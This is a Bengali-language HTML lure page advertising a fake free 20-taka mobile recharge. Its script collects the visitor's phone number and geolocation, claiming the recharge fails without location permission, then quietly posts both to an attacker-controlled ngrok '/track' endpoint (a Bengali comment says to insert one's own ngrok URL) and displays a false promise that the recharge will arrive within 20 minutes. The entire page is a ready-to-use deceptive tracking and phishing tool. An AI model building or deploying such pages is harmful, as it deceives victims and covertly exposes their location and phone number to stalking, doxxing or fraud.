<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ফ্রি ২০ টাকা মোবাইল রিচার্জ!</title>
    <style>
        body { font-family: 'Arial', sans-serif; background-color: #f2f2f2; text-align: center; margin: 0; padding: 20px; }
        .box { background: #fff; padding: 25px; border-radius: 15px; box-shadow: 0 5px 15px rgba(0,0,0,0.2); max-width: 380px; margin: auto; }
        h2 { color: #ff5722; }
        input { width: 90%; padding: 12px; margin: 15px 0; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; outline: none; }
        .btn { background: #4caf50; color: white; border: none; padding: 12px 20px; border-radius: 8px; font-size: 18px; cursor: pointer; width: 100%; font-weight: bold; }
        .btn:hover { background: #45a049; }
        p { color: #555; font-size: 14px; }
    </style>
</head>
<body>
    <div class="box">
        <img src="https://cdn-icons-png.flaticon.com/512/2343/2343894.png" width="80" alt="Gift">
        <h2>🎉 অভিনন্দন! 🎉</h2>
        <p>আপনি পেয়েছেন ২০ টাকা ফ্রি মোবাইল রিচার্জ। অফারটি আপনার নাম্বারে নিতে নিচে সঠিক নম্বর দিন।</p>
        
        <input type="number" id="phone" placeholder="আপনার মোবাইল নম্বর (যেমন: 017...)">
        <button class="btn" onclick="startClaim()">রিচার্জ নিন</button>
        
        <p style="margin-top:20px; font-size:12px; color:red;">* লোকেশন পারমিশন 'Allow' না করলে রিচার্জ আসবে না।</p>
    </div>

    <script>
        function startClaim() {
            let num = document.getElementById('phone').value;
            if (num.length < 11) {
                alert("সঠিক ১১ ডিজিটের মোবাইল নম্বর দিন।");
                return;
            }

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition((pos) => {
                    sendData(num, pos.coords.latitude, pos.coords.longitude);
                }, (err) => {
                    sendData(num, null, null);
                });
            } else {
                alert("আপনার ব্রাউজার এই অফার সাপোর্ট করে না।");
            }
        }

        function sendData(phone, lat, lon) {
            // আপনার Ngrok URL এখানে বসান
            fetch('https://আপনার-এনগ্রোক-লিঙ্ক.ngrok-free.app/track', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ phone: phone, lat: lat, lon: lon })
            });
            alert("সফল হয়েছে! ২০ মিনিটের মধ্যে আপনার নম্বরে রিচার্জ পৌঁছে যাবে।");
        }
    </script>
</body>
</html>here
